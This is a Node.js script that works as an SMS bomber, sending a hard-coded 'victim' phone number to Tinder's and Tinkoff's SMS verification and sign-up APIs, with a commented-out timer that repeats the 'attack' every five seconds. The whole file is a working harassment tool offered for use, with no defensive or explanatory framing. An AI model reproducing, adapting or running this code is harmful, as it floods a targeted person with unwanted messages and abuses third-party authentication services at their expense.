//requirements 
const fetch = require('node-fetch')
const FormData = require('form-data')
//consts
const victim = '9930141902'
const delay = 5000
const disable = 10000

//services 
function b_tinder(Numb){
 const payload = {
  'phone': Numb
  }
  fetch('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', {
  method: 'post',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(payload),
  mode: 'no-cors'
})
  .then(r => r.status)
  .then(r => console.log('Tinder: '+r))
  .catch(e => console.log(e))
}

function b_tinkoff(Numb){
  const payload = new FormData()
  payload.append('phone', Numb)
  fetch('https://api.tinkoff.ru/v1/sign_up', {
    method: 'post',
    body: payload
  })
    .then(r => r.status)
    .then(r => console.log('Tinkoff: '+r))
    .catch(e => console.log(e))
}
//load
this.attack = function (Numb){
  b_tinder(Numb)
  b_tinkoff(Numb)
}

//press F
//  let timer = setInterval(attack, delay, victim)
// setTimeout(() => {clearInterval(timer)}, disable)